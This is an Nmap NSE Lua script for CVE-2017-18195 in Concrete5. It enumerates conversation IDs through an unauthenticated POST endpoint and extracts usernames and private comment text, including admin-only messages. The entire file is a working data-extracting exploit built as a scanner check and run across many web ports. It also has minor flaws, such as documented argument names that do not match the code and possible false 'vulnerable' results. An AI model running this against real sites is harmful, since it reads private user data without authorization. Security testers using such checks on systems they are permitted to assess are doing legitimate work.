local http = require "http"
local shortport = require "shortport"
local string = require "string"
local stdnse = require "stdnse"
local vulns = require "vulns"
local table = require "table"

description = [[
Concrete5 - CVE-2017-18195 - Authorization Bypass Through User-Controlled Key (IDOR)
]]

---
-- @usage nmap --script http-vuln-cve2017-18195 -p 80 <target>
-- @output
-- PORT   STATE SERVICE VERSION
-- 80/tcp open  http    
-- | http-vuln-cve2017-18195:
-- |   VULNERABLE:
-- |   Concrete5 Authorization Bypass Through User-Controlled Key (IDOR)
-- |       State: VULNERABLE
-- |     IDs:  CVE:CVE-2017-18195
-- |     Risk factor: High
-- |       An unauthenticated user can enumerate comments from all blog posts by POSTing requests 
-- |       to /index.php/tools/required/conversations/view_ajax with incremental 'cnvID' integers. 
-- |
-- |     Disclosure date: 2018-02-23
-- |     Extra information:
-- |       cnvID	| User	| Message
-- |       1	| user	| Registered user adding comment to private blog
-- |       2	| user	| Registered user adding comment to private blog
-- |       3	| user	| Registered user adding comment to private blog
-- |       4	| user	| Registered user adding comment to private blog
-- |       5	| user	| Registered user adding comment to private blog
-- |       6	| admin	| Comment only admins should be able to read
-- |     References:
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18195
--
--
-- @args http-vuln-tbd.uri points to the path where the POST request
-- @args http-vuln-tbd.start_id sets the first comment to get
-- @args http-vuln-tbd.end_id sets the last comment to get
--
-- @xmloutput
-- <table key="CVE-2017-18195">
-- <elem key="title">Concrete5 Authorization Bypass Through User-Controlled Key (IDOR)</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="ids">
-- <elem>CVE:CVE-2017-18195</elem>
-- </table>
-- <table key="description">
-- <elem>An unauthenticated user can enumerate comments from all blog posts by POSTing requests to /index.php/tools/required/conversations/view_ajax with incremental 'cnvID' integers.</elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="day">23</elem>
-- <elem key="month">02</elem>
-- <elem key="year">2018</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2018-02-23</elem>
-- <table key="check_results">
-- </table>
-- <table key="extra_info">
-- </table>
-- <table key="refs">
-- <elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18195</elem>
-- </table>
-- </table>
--
---

author = "Chapman (R3naissance) Schleiss"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive"}

-- aquatone xlarge ports
portrule = shortport.port_or_service( {80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 2082, 2087, 2095, 2096, 2480, 3000, 3128, 3333, 4243, 4567, 4711, 4712, 4993, 5000, 5104, 5108, 5800, 6543, 7000, 7396, 7474, 8000, 8001, 8008, 8014, 8042, 8069, 8080, 8081, 8088, 8090, 8091, 8118, 8123, 8172, 8222, 8243, 8280, 8281, 8333, 8443, 8500, 8834, 8880, 8888, 8983, 9000, 9043, 9060, 9080, 9090, 9091, 9200, 9443, 9800, 9981, 12443, 16080, 18091, 18092, 20720, 28017}, {"http", "https"}, "tcp", "open")

action = function(host, port)
  local function get_cnv(id)
    options = {}
    options['timeout'] = 1000

    data = {}
    data['cnvID'] = id
    data['cID'] = '1'

    local response = http.post(host, port, vuln_uri, options, nil, data)
    stdnse.debug1("Response %s", response.status) 

    if response.status then
      username = string.match(response.body, '%-username%"%>(.-)%<%/span')
      message = string.match(string.match(response.body, '%-body%"%>(.-)%<%/div'), '%s%s+(.-)%s%s+')
      stdnse.debug1("%s: %s", username, message)
    end
  end

  local vuln_table = {
    title = "Concrete5 Authorization Bypass Through User-Controlled Key (IDOR)",
    IDS = {CVE = 'CVE-2017-18195'},
    risk_factor = "High",
    references = {
        'https://nvd.nist.gov/vuln/detail/CVE-2017-18195',
        'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18195'
    },
    dates = {
      disclosure = {year = '2018', month = '02', day = '23'},
    },
    check_results = {},
    extra_info = {}
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  vuln_table.state = vulns.STATE.NOT_VULN
  table.insert(vuln_table.extra_info, string.format("cnvID\t| User\t| Message"))

  vuln_uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or '/index.php/tools/required/conversations/view_ajax'
  local start_id = stdnse.get_script_args(SCRIPT_NAME..".start_id") or 1
  local end_id = stdnse.get_script_args(SCRIPT_NAME..".end_id") or 10

  for i=start_id,end_id do
    if pcall(get_cnv, i) then
      vuln_table.state = vulns.STATE.VULN
      table.insert(vuln_table.extra_info, string.format("%s\t| %s\t| %s", data['cnvID'], username, message))
    else
      stdnse.debug1("No conversation in cnvID: %s", i)
    end
  end

  return vuln_report:make_output(vuln_table)

end
